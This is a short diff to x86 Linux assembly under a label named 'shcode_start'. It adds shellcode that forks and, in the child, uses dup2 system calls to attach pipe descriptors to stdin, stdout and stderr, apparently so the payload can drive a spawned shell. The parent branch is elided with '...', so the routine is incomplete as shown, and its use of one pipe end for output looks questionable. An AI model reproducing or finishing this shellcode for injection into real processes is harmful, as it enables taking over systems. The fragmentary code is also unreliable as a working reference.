@@ -29,10 +29,55 @@ shcode_start:
 	cmp	eax,0
 	je	child_dead
 
+	; fork()
+	mov	eax,2
+	int	0x80
 
+	cmp	eax,0
+	je	parent
+	jg	child			; signed compare
+	jmp	child_dead
 
+child:
+	; dup2(c2sh[1], 0)   (dup to stdin)
+	mov	eax,63
+	mov	ebx,ebp
+	add	ebx,c2sh_1
+	mov	ebx, [ebx]
+	xor	ecx,ecx
+	int	0x80
 
+	cmp	eax,0
+	jne	leave
 
+	; dup2(sh2c[0], 1)   (dup to stdout)
+	mov	eax,63
+	mov	ebx,ebp
+	add	ebx,sh2c_0
+	mov	ebx, [ebx]
+	xor	ecx,ecx
+	inc	ecx
+	int	0x80
+
+	cmp	eax,0
+	jne	leave
+	
+	; dup2(sh2c[0], 2)   (dup to stderr)
+	mov	eax,63
+	mov	ebx,ebp
+	add	ebx,sh2c_0
+	mov	ebx, [ebx]
+	xor	ecx,ecx
+	inc	ecx
+	inc	ecx
+	int	0x80
+
+	cmp	eax,0
+	jne	leave
+
+parent:
+
+...
 
 
 child_dead:
@@ -56,7 +101,7 @@ child_dead:
 	jmp	child_dead
 
 leave_sh:
-	; exit
+	; exit-point for BOTH parent and child
 	mov	eax,1
 	mov	ebx,0
 	int	0x80
